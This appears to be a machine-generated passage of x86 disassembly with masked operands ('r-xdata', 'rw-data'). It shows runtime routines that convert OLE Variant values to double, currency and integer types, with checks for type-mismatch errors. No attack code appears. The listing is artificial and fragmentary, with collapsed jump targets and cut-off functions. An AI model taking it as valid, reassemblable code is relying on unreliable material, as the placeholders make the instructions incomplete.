sahf
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ esp ]
jmp r-xdata
mov eax ebx
call sub_410238
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x1
sbb eax eax
inc eax
mov [ esp ] al
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0x0
setne [ esp ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
call sub_4103f0
mov [ esp ] al
jmp r-xdata
setne al
mov [ esp ] al
jmp r-xdata
cmp [ eax ] 0x0
sub_410738
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4107ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412390
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404124
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
call sub_4092fc
test al al
je r-xdata
sub edx 0x7ffdfffb
jne r-xdata
mov dx [ ebx ]
mov cx 0x5
mov eax 0x80020005
call sub_40e5d4
jmp r-xdata
fld [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov dx [ ebx ]
mov cx 0x5
call sub_40e5d4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4107f4
lea eax [ ebp - 0x1c ]
call sub_403e9c
lea eax [ ebp - 0xc ]
call sub_40457c
retn
sub_4107fc
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x5
call sub_40e5d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410848
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41089d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40eca0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4108f8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4108a4
lea eax [ ebp - 0x18 ]
call sub_40e978
retn
sub_4108ac
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x5
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4108f8
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410914 ]
mov eax ebx
call sub_410738
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
fild [ ebx + 0x8 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410738
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4108f8
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4107fc
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410848
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x5
mov ax 0x1
call sub_40e194
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4108ac
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4107fc
fstp [ esp ]
fwait
mov eax ebx
call sub_4107fc
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_410af1 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410738
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4108f8
fstp [ esp ]
fwait
jmp r-xdata
sub_410c74
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_410dd9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4108f8
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_410c96 ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40e194
sub_410e04
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_410ee0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412390
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404124
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40ab28
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ee7
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403ec0
lea eax [ ebp - 0xc ]
call sub_40457c
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404124
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409318
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40e5d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40e5d4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_410ef0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e5d4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_410f50
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40e5d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_410f9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_410ff1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40eca0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_41104c
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410ff8
lea eax [ ebp - 0x18 ]
call sub_40e978
retn
sub_411000
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_41104c
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411068 ]
mov eax ebx
call sub_410e04
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410f50
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_410e04
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_410ef0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41104c
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410f50
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_410f9c
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40e194
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411000
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_410f50
fstp [ esp ]
fwait
mov eax ebx
call sub_410f50
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411233 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_410f50
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_410e04
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_410ef0
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_41104c
fstp [ esp ]
fwait
jmp r-xdata
sub_41139c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411448
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412390
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404124
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409370
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41144f
lea eax [ ebp - 0x10 ]
call sub_403e9c
lea eax [ ebp - 0xc ]
call sub_40457c
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40e5d4
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40e5d4
jmp r-xdata
sub_411458
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e5d4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4114b8
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40e5d4
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411504
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411559
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40eca0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4115b4
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411560
lea eax [ ebp - 0x18 ]
call sub_40e978
retn
sub_411568
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4133b0
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4115b4
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4115d0 ]
mov eax ebx
call sub_41139c
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41139c
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411458
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4115b4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411504
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40e194
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411568
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4117d5 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4114b8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41139c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411458
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4115b4
fistp [ esp ]
fwait
jmp r-xdata
sub_411980
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40457c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40e5d4
pop ebx
pop ebp
retn 0x8
sub_4119b8
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_40457c
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40e5d4
pop ebx
pop ebp
retn 0x8
sub_4119f0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_411aa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40457c
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40e5d4
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411aad
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ec0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404124
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407bf4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4046c8
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404124
